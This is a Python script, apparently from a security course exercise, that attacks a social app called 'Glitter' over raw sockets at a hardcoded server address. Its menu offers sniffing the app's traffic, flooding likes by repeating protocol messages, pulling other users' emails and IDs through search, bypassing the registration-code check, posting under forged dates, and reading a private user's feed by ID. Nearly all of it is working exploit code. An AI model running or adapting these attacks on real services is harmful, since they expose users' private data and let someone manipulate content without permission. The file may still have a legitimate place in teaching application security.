from scapy.all import *
import socket

global_user_id = ""

SERVER_IP = "54.187.16.171"
SERVER_PORT = 1336

EMPTY_SEARCH = "305#Entities search result{gli&&er}[]##"


def checksum_calc(username, password):

    """
    Input: Username, Password
    Output: Checksum
    Action: Calculates checksum by the ascii value of each char of both strings
    """

    string = username + password
    checksum = 0

    for i in string:
        checksum += ord(i)

    return checksum


def is_valid(pack):

    """
    Input: Package
    Output: True, False
    Action: If the IP src or dst and port src or dst is from the app return True else False
    """

    return TCP in pack and Raw in pack and IP in pack and (pack[IP].dst == SERVER_IP or pack[IP].src == SERVER_IP) and (pack[TCP].dport == SERVER_PORT or pack[TCP].sport == SERVER_PORT)


def print_valid(pack):

    """
    Input: Package
    Output: None
    Action: Print Package data
    """

    data = pack[Raw].load.decode(errors="ignore")

    if pack[IP].src == SERVER_IP:
        print("From Server", '-',  pack[IP].src, '-', pack[TCP].sport)

    else:
        print("From Me", '-', pack[IP].src, '-', pack[TCP].sport)

    print(data)


def send_reply(sock, data, do_print=True):

    """
    Input: Socket, Data, Optionally: Turn off the print request
    Output: Decoded Response
    Action: Send the data to the socket and return the response
    """

    if do_print:
        print(data)

    sock.sendall(data.encode())
    return sock.recv(1024).decode()


def login(username, password, keep_socket=False):

    """
    Input: Username, Password, Optionally: Return the socket
    Output: Optionally: Return the socket
    Action: Login manually
    """

    global global_user_id

    # Login Messages
    msg1 = """100#{gli&&er}{"user_name":"%s","password":"%s","enable_push_notifications":true}##""" % (username, password)
    msg2 = "110#{gli&&er}%s##" % checksum_calc(username, password)
    msg3 = "310#{gli&&er}%s##"
    msg4 = "440#{gli&&er}%s##"
    msg5 = """500#{gli&&er}{"feed_owner_id":%s,"end_date":"2024-06-18T13:55:19.950Z","glit_count":2}##"""

    # Connect to server
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket.connect((SERVER_IP, SERVER_PORT))
    print(end='\n')

    print(send_reply(my_socket, msg1))

    #  Extract data from response 2 for later messages
    res2 = send_reply(my_socket, msg2)

    first_index = res2.find("\"id\"") + 5
    last_index = res2.find(',', first_index)
    user_id = res2[first_index:last_index]
    global_user_id = user_id

    msg3 = msg3 % user_id
    msg4 = msg4 % user_id
    msg5 = msg5 % user_id
    print(res2)

    print(send_reply(my_socket, msg3))
    print(send_reply(my_socket, msg4))
    print(send_reply(my_socket, msg5))

    # If not chose to keep socket, close it
    if not keep_socket:
        my_socket.close()

    # If chose to keep socket, return socket
    else:
        return my_socket


def print_users_info(response):

    """
    Input: Search response
    Output: None
    Action: Get a search response string
    and extract name, user id, email
    and print it nicely
    """

    current_index = 0

    while current_index != -1:
        # Extract name
        current_index = response.find("\"screen_name\"", current_index)
        if current_index == -1:
            break

        current_index += len("\"screen_name\":") + 1
        temp_index = response.find('"', current_index)
        name = response[current_index:temp_index]

        # Extract id
        current_index = response.find("\"id\"", temp_index)
        if current_index == -1:
            break

        current_index += len("\"id\":")
        temp_index = response.find(',', current_index)
        user_id = response[current_index:temp_index].strip()

        # Extract email
        current_index = response.find("\"mail\"", temp_index)
        if current_index == -1:
            break

        current_index += len("\"mail\":") + 1
        temp_index = response.find('"', current_index)
        email = response[current_index:temp_index]

        print(f"Name: {name}")
        print(f"ID: {user_id}")
        print(f"Email: {email}\n")


def search_user_id(username, socket):

    """
    Input: Username, Socket
    Output: None
    Action: Search user and get extra info on him (User ID, Email)
    """

    msg = """300#{gli&&er}{"search_type":"SIMPLE","search_entry":"%s"}##
    320#{gli&&er}%s##""" % (username, global_user_id)

    # Send and get responses
    first_res = send_reply(socket, msg, do_print=False)
    is_first_valid = first_res.find("305#") != -1  # Checks if it's the right search response

    second_res = socket.recv(1024).decode()
    is_second_valid = second_res.find("305#") != -1  # Checks if it's the right search response

    print(end='\n')

    # If those responses are not valid like due to server pressure or invalid name, print error message
    if (not is_first_valid and not is_second_valid) or (EMPTY_SEARCH in first_res or EMPTY_SEARCH in second_res):
        print("Server failed to provide info\n")

    if is_first_valid:
        first_res = first_res[first_res.find("305#"):]
        print_users_info(first_res)

    if is_second_valid:
        second_res = second_res[second_res.find("305#"):]
        print_users_info(second_res)

    socket.close()


def print_messages_and_id(msg):

    """
    Input: Message response
    Output: None
    Action: Get a feed load response string
    and print all the messages and their ID
    """

    current_index = 0

    while current_index != -1:

        # Extract content
        current_index = msg.find("\"content\"", current_index)
        if current_index == -1:
            break

        current_index += len("\"content\"") + 2
        temp_index = msg.find(',', current_index) - 1
        name = msg[current_index:temp_index]

        # Extract post id
        current_index = temp_index
        current_index = msg.find("\"id\"", current_index)
        if current_index == -1:
            break

        current_index += len("\"id\"") + 1
        temp_index = msg.find('}', current_index)
        user_id = msg[current_index:temp_index]

        print(f"Content: {name}")
        print(f"ID: {user_id}\n")


def add_likes(username, password):

    """
    Input: Username, Password
    Output: None
    Action: Create a menu to add a like to post
    with the option to view the messages and their id
    """

    sock = login(username, password, keep_socket=True)

    msg = """710#{gli&&er}{"glit_id":%s,"user_id":%s,"user_screen_name":"%s","id":-1}##\n"""
    load = """500#{gli&&er}{"feed_owner_id":%s,"end_date":"3000-06-20T17:01:31.442Z","glit_count":2}##""" % global_user_id

    while True:

        print("0. Exit like hack")
        print("1. Get posts info")
        print("2. Put likes on post")

        like_choice = input("Enter choice: ")

        # Exit state
        if like_choice == '0':
            break

        # Show messages
        elif like_choice == '1':
            res = send_reply(sock, load, do_print=False)
            print_messages_and_id(res)

        # Add likes
        elif like_choice == '2':
            post_id = input("Enter post id: ")
            likes_num = int(input("Enter the num of likes: "))
            msg = msg % (post_id, global_user_id, username)
            msg = msg * likes_num
            print(send_reply(sock, msg))
            break

        else:
            print("Invalid input!\n")

    sock.close()


def sign_up_with_shorter_registration_code(registration_code, screen_name, avatar, description, privacy, username, password, gender, email):

    """
    Input: None
    Output: None
    Action: Get info to signing up
    and doing it manually allow the user to put a smaller registration code
    """

    # Create sign up message
    sign_up_msg = """150#{gli&&er}{"registration_code":"%s","user":{"screen_name":"%s","avatar":"%s","description":"%s","privacy":"%s","id":-1,"user_name":"%s","password":"%s","gender":"%s","mail":"%s"}}##\n"""
    sign_up_msg = sign_up_msg % (registration_code, screen_name, avatar, description, privacy, username, password, gender, email)

    # Create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))

    # Send message
    print(send_reply(sock, sign_up_msg))

    sock.close()


def main():
    global global_user_id

    while True:

        print("0. Exit")
        print("1. Sniff")
        print("2. Add Likes hack")
        print("3. Find extra info on user")
        print("4. Put a shorter registration code when create an account")
        print("5. Post Glit with false time info")
        print("6. View private user feed")

        choice = input("Enter choice: ")

        if choice == '0':
            # Exit
            return

        elif choice == '1':
            # Sniff packages
            sniff(lfilter=is_valid, prn=print_valid)

        elif choice == '2':
            # Add extra likes

            username = input("Enter username: ")
            password = input("Enter password: ")
            add_likes(username, password)

        elif choice == '3':
            # Search user with extra info

            sock = login(input("Enter username too login first: "), input("Enter password too login first: "), keep_socket=True)
            search_user_id(input("Enter the name of the user: "), sock)

        elif choice == '4':
            # Bypass registration code length restrictions

            registration_code = input("Enter registration code: ")
            screen_name = input("Enter screen name: ")
            avatar = input("Enter avatar: ")
            description = input("Enter description: ")
            privacy = input("Enter your privacy preference: ")
            username = input("Enter user name: ")
            password = input("Enter password: ")
            gender = input("Enter your gender: ")
            email = input("Enter your email address: ")

            sign_up_with_shorter_registration_code(registration_code, screen_name, avatar, description, privacy, username, password, gender, email)

        elif choice == '5':
            # Post a glitter with false date info

            msg = """550#{gli&&er}{"feed_owner_id":%s,"publisher_id":%s,"publisher_screen_name":"idk someone","publisher_avatar":"im1","background_color":"White","date":"%s-%s-%sT06:51:14.482Z","content":"%s","font_color":"black","id":-1}##"""

            year = input("Enter year you wish to fake (Remember to use 0): ")
            month = input("Enter month you wish to fake (Remember to use 0): ")
            day = input("Enter day you wish to fake (Remember to use 0): ")

            username = input("Enter user name: ")
            password = input("Enter password: ")
            content = input("What do you wish to post: ")

            sock = login(username, password, keep_socket=True)
            msg = msg % (global_user_id, global_user_id, year, month, day, content)

            print(send_reply(sock, msg))

            sock.close()

        elif choice == '6':
            # View private users feed

            load_profile = """440#{gli&&er}43919##"""
            load_messages = """500#{gli&&er}{"feed_owner_id":43919,"end_date":"2024-06-21T07:57:24.508Z","glit_count":2}##"""

            username = input("Enter user name to login first: ")
            password = input("Enter password to login first: ")

            sock = login(username, password, keep_socket=True)

            print(send_reply(sock, load_profile))
            print(send_reply(sock, load_messages))

            sock.close()

        else:
            print("Invalid input!\n")


if __name__ == "__main__":
    main()
